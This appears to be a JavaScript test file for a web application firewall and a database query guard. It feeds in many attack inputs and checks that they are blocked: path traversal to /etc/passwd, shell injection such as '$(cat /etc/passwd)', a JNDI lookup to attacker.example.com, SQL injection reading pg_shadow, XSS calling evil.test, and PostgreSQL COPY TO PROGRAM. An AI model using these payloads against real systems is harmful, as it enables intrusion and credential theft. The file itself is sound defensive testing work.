import assert from 'node:assert/strict';
import {
	inspectDatabaseSql,
	inspectJsonPayload,
	inspectRequestComponents,
	inspectRequestPayload,
	maskDatabaseRow,
} from '../../src/lib/waf.ts';
import { UA, check } from './runner.mjs';

export function runWafGuardsChecks() {
	check('waf: inspectRequestComponents detects offensive scanners, traversal, cmdi, sqli, and xss without false positives', () => {
		assert.deepEqual(
			inspectRequestComponents({
				pathname: '/api/events',
				search: '?q=AI+Workshop&page=1',
				userAgent: UA.macSafari,
			}),
			{ matched: false, points: 0 }
		);

		assert.equal(
			inspectRequestComponents({
				pathname: '/api/newsItems/%E0%A4%A',
				search: '?q=%ZZ',
			}).matched,
			false
		);

		const mixedMalformed = inspectRequestComponents({
			pathname: '/api/members',
			search: '?bad=%ZZ&q=1%20UNION%20SELECT%201',
		});
		assert.equal(mixedMalformed.matched, true);
		assert.equal(mixedMalformed.category, 'sqli');

		const doubleEncodedTraversal = inspectRequestComponents({
			pathname: '/api/files',
			search: '?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd',
		});
		assert.equal(doubleEncodedTraversal.matched, true);
		assert.equal(doubleEncodedTraversal.category, 'path_traversal');

		for (const bot of ['sqlmap/1.8', 'Mozilla/5.0 (compatible; Nuclei - Open-source project)', 'ffuf/v2.1.0', 'Nikto/2.5.0']) {
			const res = inspectRequestComponents({ pathname: '/api/members', userAgent: bot });
			assert.equal(res.matched, true, bot);
			assert.equal(res.category, 'scanner', bot);
			assert.ok(res.points >= 80, bot);
		}

		for (const canary of ['/.env', '/.env.local', '/.git/config', '/wp-admin/install.php', '/wp-login.php', '/phpmyadmin', '/actuator/health']) {
			const res = inspectRequestComponents({ pathname: canary });
			assert.equal(res.matched, true, canary);
			assert.equal(res.category, 'scanner', canary);
			assert.equal(res.points, 100, canary);
		}

		for (const target of ['/api/files/../../etc/passwd', '/api/test?file=%2e%2e%2f%2e%2e%2fetc%2fshadow', '/api/read?p=/proc/self/environ']) {
			const res = inspectRequestComponents({ pathname: target });
			assert.equal(res.matched, true, target);
			assert.equal(res.category, 'path_traversal', target);
		}

		for (const sample of [
			{ pathname: '/api/ping', search: '?host=127.0.0.1;whoami' },
			{ pathname: '/api/ping', search: '?x=$(cat /etc/passwd)' },
			{ pathname: '/api/login', userAgent: '${jndi:ldap://attacker.example.com/a}' },
		]) {
			const res = inspectRequestComponents(sample);
			assert.equal(res.matched, true, JSON.stringify(sample));
			assert.equal(res.category, 'cmd_injection', JSON.stringify(sample));
		}

		for (const q of [
			'?q={{7*7}}',
			'?q={{ 7 * 7 }}',
			'?q=${7*7}',
			'?q=${ 7 * 7 }',
			'?q={{ 10 / 2 }}',
			'?name={{config}}',
			'?template=<%=7*7%>',
			'?x={{self}}',
			'?ctx={{ lipsum }}',
		]) {
			const res = inspectRequestComponents({ pathname: '/api/search', search: q });
			assert.equal(res.matched, true, q);
			assert.equal(res.category, 'cmd_injection', q);
		}

		for (const q of [
			'?__proto__[polluted]=true',
			'?__proto__.isAdmin=true',
			'?constructor[prototype][isAdmin]=true',
			'?constructor.prototype[admin]=true',
			'?prototype.polluted=yes',
		]) {
			const res = inspectRequestComponents({ pathname: '/api/data', search: q });
			assert.equal(res.matched, true, q);
			assert.equal(res.category, 'cmd_injection', q);
		}

		for (const q of [
			"?id=1' OR '1'='1'",
			"?id=1' OR 'a'='a'",
			"?id=1' OR 2=2",
			'?q=1+UNION+ALL+SELECT+null,usename,passwd+FROM+pg_shadow',
			'?q=1+UNION/**/SELECT+1,2,3',
			'?sort=id;SELECT+table_name+FROM+information_schema.tables',
			'?delay=pg_sleep(10)',
		]) {
			const res = inspectRequestComponents({ pathname: '/api/members', search: q });
			assert.equal(res.matched, true, q);
			assert.equal(res.category, 'sqli', q);
		}

		for (const q of [
			'?q=<script>alert(1)</script>',
			'?redirect=javascript:alert(document.cookie)',
			'?avatar=<img src=x onerror=alert(1)>',
			'?name=<svg onload=fetch("https://evil.test")>',
		]) {
			const res = inspectRequestComponents({ pathname: '/api/search', search: q });
			assert.equal(res.matched, true, q);
			assert.equal(res.category, 'xss', q);
		}

		const attackReq = new Request('https://orbit.example.org/api/members?id=1%20UNION%20SELECT%201,2,3', {
			headers: { 'user-agent': UA.linuxChrome },
		});
		const reqResult = inspectRequestPayload(attackReq);
		assert.equal(reqResult.matched, true);
		assert.equal(reqResult.category, 'sqli');
	});

	check('waf: inspectJsonPayload recursively detects SQLi, SSTI, Prototype Pollution in JSON bodies', () => {
		assert.equal(inspectJsonPayload({ title: 'Toplant\u0131 Notes', content: 'Hello world', count: 42 }).matched, false);

		const sqliJson = {
			user: {
				preferences: {
					theme: 'dark',
					bio: "admin' UNION SELECT 1,2,3--",
				},
			},
		};
		const resSqli = inspectJsonPayload(sqliJson);
		assert.equal(resSqli.matched, true);
		assert.equal(resSqli.category, 'sqli');

		const sstiJson = { tags: ['tech', '{{7*7}}', 'club'] };
		const resSsti = inspectJsonPayload(sstiJson);
		assert.equal(resSsti.matched, true);
		assert.equal(resSsti.category, 'cmd_injection');

		const protoJson = JSON.parse('{"__proto__": {"polluted": "yes"}}');
		const resProto = inspectJsonPayload(protoJson);
		assert.equal(resProto.matched, true);
		assert.equal(resProto.category, 'cmd_injection');
	});

	check('waf: inspectDatabaseSql and maskDatabaseRow enforce Zero-Trust Database Studio guards', () => {
		const cleanSelect = inspectDatabaseSql('SELECT id, name, surname, email FROM users LIMIT 10');
		assert.equal(cleanSelect.allowed, true);

		for (const badSql of [
			"COPY (SELECT 1) TO PROGRAM 'id'",
			"SELECT pg_read_file('/etc/passwd')",
			"DO $$ BEGIN EXECUTE 'DELETE FROM system_logs'; END $$",
		]) {
			const res = inspectDatabaseSql(badSql);
			assert.equal(res.allowed, false, badSql);
			assert.ok(res.strikePoints >= 60, badSql);
		}

		for (const badWrite of [
			'DELETE FROM system_logs WHERE id = 1',
			"UPDATE security_blocks SET status = 'whitelist'",
			'TRUNCATE TABLE webauthn_credentials',
			'DROP TABLE oauth_clients',
			"INSERT INTO system_settings (key, value) VALUES ('soc_lockdown_mode', 'false')",
			"UPDATE system_settings SET value = 'plain' WHERE key = 'smtp_pass'",
		]) {
			const res = inspectDatabaseSql(badWrite);
			assert.equal(res.allowed, false, badWrite);
		}

		for (const secLeak of [
			'SELECT sessionToken AS x FROM users',
			'SELECT passwordHash FROM users',
			'SELECT totpSecret, totpRecoveryCodes FROM users',
			'SELECT secretHash FROM oauth_clients',
			"SELECT value AS leak FROM system_settings WHERE key = 'smtp_pass'",
		]) {
			const res = inspectDatabaseSql(secLeak);
			assert.equal(res.allowed, false, secLeak);
		}

		assert.equal(
			inspectDatabaseSql("SELECT 1; ROLLBACK; UPDATE users SET role_id = 'role_admin'", { isExplain: true }).allowed,
			false
		);
		assert.equal(
			inspectDatabaseSql("UPDATE users SET name = 'Test'", { isExplain: true }).allowed,
			false
		);
		const explainStripped = inspectDatabaseSql('EXPLAIN ANALYZE SELECT id, name FROM users;', { isExplain: true });
		assert.equal(explainStripped.allowed, true);
		assert.equal(explainStripped.normalizedExplainTarget, 'SELECT id, name FROM users');

		assert.deepEqual(
			maskDatabaseRow({
				id: 'usr_1',
				email: 'test@orbit.example.org',
				passwordHash: 'plain-or-hashed',
				aliasedBcrypt: '$2b$10$abcdefghijklmnopqrstuv',
				aliasedCipher: 'enc:v1:123456',
			}),
			{
				id: 'usr_1',
				email: 'test@orbit.example.org',
				passwordHash: '••••••••',
				aliasedBcrypt: '••••••••',
				aliasedCipher: '••••••••',
			}
		);
		assert.deepEqual(
			maskDatabaseRow({ key: 'smtp_pass', value: 'unencrypted-secret-value' }),
			{ key: 'smtp_pass', value: '••••••••' }
		);
		assert.deepEqual(
			maskDatabaseRow({ key: 'site_title', value: 'Orbit Studio' }),
			{ key: 'site_title', value: 'Orbit Studio' }
		);
	});
}
